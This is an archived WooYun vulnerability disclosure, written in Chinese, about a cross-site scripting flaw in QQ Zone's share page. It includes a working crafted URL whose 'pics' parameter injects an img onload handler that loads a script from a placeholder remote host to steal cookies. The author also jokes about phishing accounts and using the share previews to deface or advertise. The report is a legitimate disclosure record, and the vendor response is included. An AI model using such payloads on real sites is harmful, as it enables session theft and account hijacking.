@@ -1,0 +1,211 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		分享到QQ空间XSS可获取大量COOKIE  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		分享到QQ空间XSS可获取大量COOKIE  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/thx">thx</a> 
+</li><li>提交时间：		2014-01-25 19:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-05：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-15：	细节向普通白帽子公开<br/>
+									2014-02-25：	细节向实习白帽子公开<br/>
+									2014-03-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">分享到QQ空间XSS，可获取COOKIE</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.baidu.com&amp;showcount=0&amp;desc=baidu&amp;summary=baidu&amp;site=baidu&amp;pics=http%3A%2F%2Fwww.baidu.com%2Fimg%2Fbdlogo.gif%23%22%20onload%3D%22var%20s%3Ddocument.createElement%28%27script%27%29%3Bs.src%3D%27http%3A%2F%2Fxxx.xxx.xxx%2FwowS3i%3F1390008412%27%3Bdocument.body.appendChild%28s%29%3B&amp;style=202&amp;width=105&amp;height=31&amp;otype=share&amp;showcount=<br />
+<br />
+<br />
+<br />
+参数pics=图片地址 存在XSS ，#号绕过图片验证 ，可用onload属性，基本没什么过滤。带入后实际代码如下<br />
+<br />
+</p><pre><code>&lt;img width=&quot;72px&quot; src=&quot;http://www.baidu.com/img/bdlogo.gif#&quot; onload=&quot;var s=document.createElement(&#039;script&#039;);s.src=&#039;http://xxx.xxx.xxx/wowS3i?1390008412&#039;;document.body.appendChild(s);&quot;&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+本来觉得能获取cookie，去钓QQ就完结了。后来想到挖洞要深入，就有了下面不成功的尝试(分享到QQ空间后这段就忽略吧，各种尝试都失败)：<br />
+<br />
+<br />
+<br />
+还是回到分享页面，第一次分享一个网址，腾讯会采集url信息然后保存，后面再分享同一个网址就只是调用第一次保存的信息。如果第一次保存的信息里能插入XSS，那后面再有人分享就直接触发了,cookie花花的来啊。<br />
+<br />
+<br />
+<br />
+腾讯抓取网页信息：http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshareget_urlinfo?fupdate=1&amp;random=0&amp;url=http%3A%2F%2Fwww.baidu.com&amp;g_tk=1642964085<br />
+<br />
+<br />
+<br />
+chrome显示:<br />
+<br />
+</p><pre><code>_Callback({<br />
+	&quot;code&quot;:0,<br />
+	&quot;subcode&quot;:0,<br />
+	&quot;message&quot;:&quot;&quot;,<br />
+	&quot;default&quot;:0,<br />
+	&quot;data&quot;:<br />
+{&quot;nick&quot;:&quot;銆鎴戝柣銆鍑°鏄&quot;,&quot;pics&quot;:&quot;&quot;,&quot;site&quot;:&quot;&quot;,&quot;summary&quot;:&quot;百度一下，你就知道\r\n搜索设置|登录 注册\r\n新 闻 网 页 贴 吧 知 道 音 乐 图 片 视 频 地 图\r\n输入法\r\n手写\r\n拼音\r\n关闭...&quot;,&quot;title&quot;:&quot;百度一下，你就知道  &quot;,&quot;type&quot;:4,&quot;uin&quot;:10000,&quot;urlcount&quot;:15480848}}<br />
+);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+抓取信息的规则，summary是&lt;body&gt;后第一个&lt;p&gt;标签之间的内容，title是&lt;title&gt;或者&lt;div id=&quot;title&quot;&gt;类似标签之间的内容,pics试了几次，搞不懂规律，抓到的图片地址也会URL编码。<br />
+<br />
+<br />
+<br />
+自己在服务器新建个网页，放上基本会抓取的代码，有输出的几个地方summary,title,pics ，各种改名改编码各种尝试。summary可以放各种标签，title放标签都被杀了，在JSON有部分符号变jsunicode，在分享页都变成htmlcode 。<br />
+<br />
+<br />
+<br />
+总觉得有可以利用的地方，但是能力确实有限，再下去就头痛了。。。不过还是可以恶搞一下，把朋友没分享过的网站主页改下，比如title改成&quot;此页是我开，QQ10000&quot;，分享一次再改回来，不留痕迹，以后他网站要是火了，别人一点分享到空间就看到你大名了。又或者在竞争对手网页放上广告，别人一分享，哈哈哈...<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/25164932ee775ce512a77c3f104e0e09e9839bbb.jpg" target="_blank"><img src="../images/25164932ee775ce512a77c3f104e0e09e9839bbb.jpg" alt="XSS成功截图" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们更懂 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/thx" title="thx">thx</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049820" title="分享到QQ空间XSS可获取大量COOKIE">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2014-01-26 09:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49820";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
